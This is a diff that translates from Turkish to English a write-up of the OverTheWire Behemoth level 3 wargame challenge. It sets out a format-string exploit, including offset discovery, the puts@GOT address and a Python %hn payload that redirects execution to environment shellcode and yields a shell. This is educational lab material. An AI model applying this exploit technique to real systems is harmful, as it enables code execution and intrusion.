@@ -1,58 +1,57 @@
 # OverTheWire — Behemoth Level 3 → 4
 
-> Hedef: `behemoth3`'ten `behemoth4` şifresi. Sonuç: **`**********`** (gizlendi)
-> Teknik: **format string** açığı → `%hn` ile `puts@GOT`'u env-shellcode'a yönlendirme.
+> Goal: Get behemoth4 password from `behemoth3`. Result: **`**********`** (hidden)
+> Technique: **format string** vulnerability → redirect `puts@GOT` to env shellcode via `%hn`.
 
 ---
 
-## 1. Bağlantı
+## 1. Connection
 ```bash
 ssh behemoth3@behemoth.labs.overthewire.org -p 2221
 ```
 
-## 2. Zafiyet — disasm/ltrace
+## 2. Vulnerability — disasm/ltrace
 ```c
 printf("Identify yourself: ");
 fgets(buf, 200, stdin);
 printf("Welcome, ");
-printf(buf);                 // AÇIK: format string = kullanıcı girdisi
+printf(buf);                 // BUG: format string = user input
 puts("\naaaand goodbye again.");
 ```
-`printf(buf)` → format string. `system`/shell yok → akışı GOT overwrite ile çalacağız.
+`printf(buf)` → format string. No `system`/shell → we'll hijack flow via GOT overwrite.
 `readelf`: `GNU_STACK RWE`.
 
-## 3. Offset + hedef
+## 3. Offset + target
 ```bash
 echo "AAAA%x.%x.%x" | ltrace /behemoth/behemoth3
-# printf("AAAA%x...", 0x41414141, ...)   -> ilk %x = AAAA  =>  offset = 1
+# printf("AAAA%x...", 0x41414141, ...)   -> first %x = AAAA  =>  offset = 1
 objdump -R /behemoth/behemoth3 | grep puts
 # 0804b218 R_386_JUMP_SLOT  puts          -> puts@GOT = 0x0804b218
 ```
-`printf(buf)`'tan SONRA `puts(...)` çağrılıyor → **puts@GOT'u** shellcode adresine yazarsam o
-`puts` shellcode'a atlar.
+`puts(...)` is called after `printf(buf)` → if we overwrite **puts@GOT** to shellcode address,
+that `puts` call will jump to shellcode.
 
-## 4. Exploit — `%hn` ile GOT'a yazma (offset 1)
-EGG'de NOP sled + shellcode; adresini getenvaddr ile bul. Shellcode adresini iki 16-bit yarıya
-bölüp `puts@GOT` (düşük yarı) ve `puts@GOT+2` (yüksek yarı)'ya `%hn` ile yaz (küçük değer önce):
+## 4. Exploit — writing to GOT with `%hn` (offset 1)
+Put NOP sled + shellcode in EGG; find address via getenvaddr. Split shellcode address into two
+16-bit halves and write to `puts@GOT` (low half) and `puts@GOT+2` (high half) via `%hn`
+(smaller value first):
 ```python
-egg = EGG_addr + 20000                     # sled ortası
-lh = egg & 0xffff; hh = (egg>>16) & 0xffff  # hh genelde 0xffff
+egg = EGG_addr + 20000                     # sled midpoint
+lh = egg & 0xffff; hh = (egg>>16) & 0xffff  # hh typically 0xffff
 got = 0x0804b218
-payload  = pack(got) + pack(got+2)          # offset 1 ve 2'deki adresler
-payload += b'%.{lh-8}x%1$hn'                # puts@GOT = lh  (4+ (lh-8) = lh)
+payload  = pack(got) + pack(got+2)          # addresses at offsets 1 and 2
+payload += b'%.{lh-8}x%1$hn'                # puts@GOT = lh  (4 + (lh-8) = lh)
 payload += b'%.{hh-lh}x%2$hn'               # puts@GOT+2 = hh
-# fgets stdin'den -> payload+"\n", bekle (printf ~64KB basar), puts->shellcode, timed komut
+# fgets reads from stdin -> payload+"\n", wait (printf prints ~64KB), puts->shellcode, timed command
 ```
-`puts@GOT` artık shellcode'u gösteriyor → `puts("aaaand goodbye...")` → shellcode → `/bin/sh`.
-Çıktı: `uid=13004(behemoth4)` → şifre.
+`puts@GOT` now points to shellcode → `puts("aaaand goodbye...")` → shellcode → `/bin/sh`.
+Output: `uid=13004(behemoth4)` → password.
 
 
-## Dersler
-| Konu | Not |
-|------|-----|
-| format string | `printf(buf)` → `%n`/`%hn` ile keyfi yazma |
-| GOT overwrite | `printf` sonrası çağrılan fonksiyonun (`puts`) GOT'unu shellcode'a çevir |
-| offset 1 | ltrace ile teyit (ilk `%x` = girdimiz) |
-| `%hn` çift yazma | 32-bit adres → iki 16-bit; küçük yarıyı önce yaz (sayaç sadece artar) |
-
-
+## Lessons
+| Topic | Note |
+|-------|------|
+| format string | `printf(buf)` → arbitrary write via `%n`/`%hn` |
+| GOT overwrite | Redirect the GOT entry of the next called function (`puts`) to shellcode |
+| offset 1 | Verified via ltrace (first `%x` = our input) |
+| `%hn` double write | 32-bit address → two 16-bit halves; write smaller value first (counter only increases) |
